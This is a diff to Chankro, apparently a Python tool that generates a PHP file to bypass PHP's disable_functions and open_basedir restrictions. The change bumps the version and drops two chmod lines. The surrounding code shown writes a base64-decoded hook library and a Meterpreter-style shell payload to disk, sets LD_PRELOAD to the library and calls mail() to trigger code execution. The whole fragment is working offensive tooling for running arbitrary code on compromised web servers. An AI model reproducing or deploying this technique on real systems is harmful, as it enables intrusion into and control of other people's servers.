@@ -1,4 +1,4 @@
-######## Chankro v0.1 #######
+######## Chankro v0.2 #######
 
 # [+] Bypass disable_functions
 # [+] Bypass open_basedir
@@ -63,8 +63,6 @@ head = "<?php\n $hook = '" + encoded_bicho  + "';\n"
 body1 = "$meterpreter = '" + encoded_shell + "';\n"
 body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook));\n"
 body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
-cosa1 = "chmod('acpid.socket', 0777);\n"
-cosa2 = "chmod('chankro.so', 0777);\n"
 cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
 tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
 tail2 = "mail('a','a','a','a');?>"
@@ -74,10 +72,6 @@ print "[+] Architecture: x" + args.arch
 print "[+] Final PHP: " + args.out + "\n\n"
 
 
-outfile.write(head + body1 + body2 + body3 + cosa1 + cosa2 + cosa3 + tail1 + tail2)
+outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
 outfile.close()
 print "[+] File created!"
-
-
-
-
